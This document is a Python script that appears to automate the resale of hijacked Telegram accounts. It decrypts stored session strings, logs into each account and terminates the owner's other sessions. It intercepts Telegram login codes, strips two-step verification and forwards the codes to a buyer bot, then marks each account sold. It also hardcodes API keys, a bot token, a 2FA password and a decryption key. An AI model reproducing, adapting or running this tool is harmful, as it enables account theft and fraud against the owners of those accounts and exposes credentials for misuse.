import asyncio
import time
import pickle
import os
import requests
import random
import shlex
import subprocess
from telethon import TelegramClient, events, functions
from telethon.sessions import StringSession
import telethon.tl.types
from datetime import datetime, timedelta

import crypter

api_id = '16017675'
api_hash = '898e9db01786302c9f95f67c23d9fecb'
pass_2fa = "542543"

TARGET_BOT = '@B172dhhsijsbwusi_bot'
cwd = os.getcwd()


async def get_me_ssn() -> str:
    print("s")
    botToken = '7678259114:AAEk9QF7FdxaN8MZ_9PN8SvYTswnigaPk3c'
    async with TelegramClient('bot.session', api_id, api_hash) as bClient:
        await bClient.start(bot_token=botToken)
        me = await bClient.get_me()
        print("BOT USER:", me.username)

        message = await bClient.get_messages(2576914746, ids=1449)

        num = message.text.split('\n\n')[0].replace("`", "")
        ssn = message.text.split('\n\n')[1].replace("`", "")

        if ssn.startswith("b'") and ssn.endswith("'"):
            ssn = ssn.replace("b'", "").replace("'", "")

        ssn = crypter.password_decrypt(ssn.encode(), 'KsP@542543').decode()
        return ssn or ""


async def kill_others(client):
    me = await client.get_me()
    print(f"{me.phone}_killing Sessions")

    GetSessions = await client(functions.account.GetAuthorizationsRequest())

    if len(GetSessions.authorizations) > 1:
        print("Another Session    :\tYes")
        for ss in GetSessions.authorizations:
            SessionHash = ss.hash
            SessionIp = ss.country
            d_mdl = ss.device_model

            print(f"{d_mdl}\n{str(SessionHash)}\n{str(SessionIp)}\n{ss.date_created}\n\n")

            if SessionHash > 0:
                await client(functions.account.ResetAuthorizationRequest(hash=SessionHash))
                print(f"{d_mdl}   :\t {str(SessionIp)}")

        return False
    else:
        await asyncio.sleep(2)
        print("Another Session    :\tNo")
        return True


async def main():
    ssn_main = await get_me_ssn()
    print("SESSION:", ssn_main)

    mClient = TelegramClient(StringSession(ssn_main), api_id, api_hash)
    await mClient.start()

    hn = (await mClient.get_me()).id
    print(hn)

    ssn_for_sell = input(f'How many SSNs You Want to Sell? ')

    all_ssns = []

    async for message in mClient.iter_messages(2576914746):

        if (
            message.replies and
            hasattr(message.replies, 'replies') and
            message.replies.replies == 0 and
            message.message.startswith("880")
        ):

            num = message.text.split('\n\n')[0].replace("`", "")
            print(num)

            ssn = message.text.split('\n\n')[1].replace("`", "")
            print(ssn)

            if ssn.startswith("b'") and ssn.endswith("'"):
                ssn = ssn.replace("b'", "").replace("'", "")

            ssn = crypter.password_decrypt(ssn.encode(), 'KsP@542543').decode()
            all_ssns.append(ssn)

            client = TelegramClient(StringSession(ssn), api_id, api_hash)

            try:
                await client.connect()

                if not await client.is_user_authorized():
                    print(f"❌ Skip (dead session)")
                    await client.disconnect()
                    continue

            except Exception as e:
                print(f"❌ Login error → {e}")
                try:
                    await client.disconnect()
                except:
                    pass
                continue

            cPhn = (await client.get_me()).phone
            print(f"✅ Logged in: +{cPhn}")

            if await kill_others(client):

                await mClient.send_message(TARGET_BOT, "📤 ارسال اکانت")
                print("📤 Order sent")

                await asyncio.sleep(2)

                await mClient.send_message(TARGET_BOT, message='+' + cPhn)

                @client.on(events.NewMessage(incoming=True, chats=777000))
                async def newMessage(event):
                    if event.raw_text.startswith("Login code:"):
                        otp = event.raw_text.replace("Login code: ", "").split('.')[0]

                        print(str(event.chat_id) + ' : ' + otp)

                        result = await client(functions.account.GetPasswordRequest())

                        if not result.has_password:
                            print("no 2fa")

                        if result.has_password:
                            print("has 2fa")
                            try:
                                await client.edit_2fa('542543')
                                print("2FA disabled successfully.")
                            except Exception as e:
                                print(f"An error occurred: {e}")

                        await asyncio.sleep(5)
                        await mClient.send_message(TARGET_BOT, otp)

                    if (
                        event.raw_text.startswith("New login") or
                        event.raw_text.startswith("Two-Step Verification enabled")
                    ):
                        print(str(event.chat_id) + ' : ' + event.raw_text.lower())
                        print("🚀 Done → Logging out")

                        await client.log_out()
                        await client.disconnect()

                await client.run_until_disconnected()

                msgID = message.id
                await mClient.send_message(2576914746, message='Sold!!', reply_to=msgID)

                print(f"{num} SOLD successfully")
                print(f"{str(len(all_ssns))} Sessions are SOLD")

                await asyncio.sleep(10)

                if str(len(all_ssns)) == ssn_for_sell:
                    return

            else:
                print(f"Other Logins Found. Skipping this")

    print(f"{str(len(all_ssns))} All Sessions are SOLD successfully")


asyncio.run(main())
